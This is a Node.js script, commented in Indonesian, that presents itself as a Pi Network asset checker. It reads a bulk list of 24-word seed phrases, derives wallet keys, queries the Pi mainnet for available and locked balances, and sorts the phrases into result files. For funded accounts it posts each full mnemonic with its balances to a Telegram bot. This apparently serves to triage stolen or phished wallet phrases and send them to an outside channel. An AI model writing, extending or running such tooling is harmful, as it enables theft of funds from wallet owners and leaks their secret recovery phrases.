// =================================================================
// Skrip Pengecek Aset Akun Pi Network
// Versi: Final
// Fitur:
// - Cek Saldo Tersedia
// - Cek Koin Terkunci (Lockup) dengan parsing yang akurat
// - Filter hasil: Hanya kirim notifikasi jika ada lockup
// - Menggunakan API resmi Pi Network
// - Jeda anti-spam
// =================================================================

const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');
const StellarSdk = require('stellar-sdk');

// --- PENGATURAN WAJIB ---
// Ganti dengan token bot Telegram Anda
const TELEGRAM_BOT_TOKEN = 'ISI_DENGAN_TOKEN_BOT_ANDA';
// Ganti dengan ID chat (bisa grup atau channel)
const TELEGRAM_CHAT_ID = 'ISI_DENGAN_CHAT_ID_ANDA';
// -------------------------

// Menggunakan endpoint resmi dan andal dari Pi Network
const server = new StellarSdk.Server('https://api.mainnet.minepi.com');

/**
 * Fungsi untuk memberi jeda dalam eksekusi.
 * @param {number} ms - Waktu jeda dalam milidetik.
 */
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Mengirim pesan ke channel/grup Telegram yang ditentukan.
 * @param {string} pesan - Teks pesan yang akan dikirim.
 */
async function kirimTelegram(pesan) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'ISI_DENGAN_TOKEN_BOT_ANDA') {
    console.warn('⚠️ Token atau Chat ID Telegram belum diatur. Pesan tidak dikirim.');
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: pesan,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('❌ Gagal kirim ke Telegram:', error.message);
    // Jika terkena rate limit dari Telegram, tunggu 10 detik
    if (error.response && error.response.status === 429) {
      console.log('Terkena rate limit Telegram, menunggu 2 detik...');
      await delay(2000);
    }
  }
}

/**
 * Mengubah 24 kata mnemonic menjadi keypair Stellar untuk Pi Network.
 * @param {string} mnemonic - Frasa mnemonic 24 kata.
 * @returns {StellarSdk.Keypair} Keypair yang bisa digunakan.
 */
function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  return StellarSdk.Keypair.fromRawEd25519Seed(key);
}

// Baca file pharses.txt dan siapkan daftar mnemonic
const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim()) // Hapus spasi di awal/akhir
  .filter(line => line && line.split(' ').length === 24); // Hanya ambil yang valid 24 kata

// Kosongkan file hasil dari eksekusi sebelumnya untuk memulai dari awal
fs.writeFileSync('valid_with_lockup.txt', '');
fs.writeFileSync('valid_no_lockup.txt', '');
fs.writeFileSync('invalid.txt', '');

/**
 * Fungsi utama untuk mengeksekusi pengecekan semua mnemonic.
 */
async function cekSemua() {
  console.log(`====================================================`);
  console.log(`Memulai pengecekan untuk ${mnemonics.length} mnemonic...`);
  console.log(`Hasil akan disimpan di:`);
  console.log(`- valid_with_lockup.txt (Ada koin terkunci)`);
  console.log(`- valid_no_lockup.txt (Terdaftar tapi kosong)`);
  console.log(`- invalid.txt (Tidak terdaftar)`);
  console.log(`====================================================`);

  for (const [index, mnemonic] of mnemonics.entries()) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      // 1. Cek apakah akun terdaftar di jaringan
      const account = await server.loadAccount(pubkey);

      // 2. Jika terdaftar, cek koin terkunci (Claimable Balances)
      const claimableBalances = await server.claimableBalances().forClaimant(pubkey).limit(50).call();

      // 3. Logika utama: HANYA proses lebih lanjut jika ada koin terkunci
      if (claimableBalances.records.length > 0) {
        console.log(`[${index + 1}/${mnemonics.length}] ✅ DITEMUKAN: Akun dengan lockup! Public Key: ${pubkey}`);
        fs.appendFileSync('valid_with_lockup.txt', `${mnemonic}\n`);

        // Dapatkan saldo yang tersedia
        const piBalance = account.balances.find(b => b.asset_type !== 'native');
        const saldoTersedia = piBalance ? parseFloat(piBalance.balance).toFixed(7) : '0.0000000';
        
        // Proses detail setiap lockup
        let pesanLockup = "\n\n🔒 *Rincian Koin Terkunci:*\n";
        let totalTerkunci = 0;

        claimableBalances.records.forEach(record => {
          const amount = parseFloat(record.amount);
          totalTerkunci += amount;

          // Cari tanggal unlock yang benar milik pengguna, bukan milik sistem
          const userClaimant = record.claimants.find(c => c.destination === pubkey);
          
          if (userClaimant && userClaimant.predicate && userClaimant.predicate.not && userClaimant.predicate.not.abs_before) {
            const unlockDate = userClaimant.predicate.not.abs_before;
            const tanggalUnlockFormatted = new Date(unlockDate).toLocaleString('id-ID', {
              timeZone: 'UTC', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit'
            });
            pesanLockup += ` - *${amount.toFixed(2)} Pi* (Buka Kunci: ${tanggalUnlockFormatted} UTC)\n`;
          } else {
            pesanLockup += ` - *${amount.toFixed(2)} Pi* (Tanggal buka kunci tidak terdeteksi)\n`;
          }
        });
        
        // Susun pesan lengkap untuk dikirim ke Telegram
        const pesan = `✅ *Akun Pi Ditemukan (ADA LOCKUP)!*\n\n` +
                      `🔑 *Mnemonic:*\n\`${mnemonic}\`\n\n` +
                      `👤 *Public Key:*\n\`${pubkey}\`\n\n` +
                      `--- Rincian Aset ---\n` +
                      `💰 *Saldo Tersedia:*\n\`${saldoTersedia} Pi\`\n\n` +
                      `🔐 *Total Terkunci:*\n\`${totalTerkunci.toFixed(7)} Pi\`\n` +
                      `${pesanLockup}`;

        await kirimTelegram(pesan);

      } else {
        // Akun ada, tapi tidak ada koin terkunci
        console.log(`[${index + 1}/${mnemonics.length}] ℹ️ Terdaftar, namun tidak ada lockup. Public Key: ${pubkey}`);
        fs.appendFileSync('valid_no_lockup.txt', `${mnemonic}\n`);
      }

    } catch (err) {
      if (err.response && err.response.status === 404) {
        // Akun sama sekali tidak terdaftar
        const keypair = mnemonicToStellarKeypair(mnemonic);
        const pubkey = keypair.publicKey();
        console.log(`[${index + 1}/${mnemonics.length}] ❌ Tidak terdaftar. Public Key: ${pubkey}`);
        fs.appendFileSync('invalid.txt', `${mnemonic}\n`);
      } else {
        // Error lain (misal: masalah jaringan, API down, dll)
        console.error(`[${index + 1}/${mnemonics.length}] ⚠️ Error saat cek mnemonic: ${mnemonic.substring(0, 15)}...`);
        console.error(`   Pesan Error: ${err.message || 'Error tidak diketahui'}`);
      }
    }

    // Beri jeda 2 detik setelah setiap pengecekan untuk menghindari blokir
    await delay(2000); 
  }

  console.log('====================================================');
  console.log('Selesai. Semua mnemonic telah berhasil dicek.');
  console.log('====================================================');
}

// Jalankan fungsi utama
cekSemua();
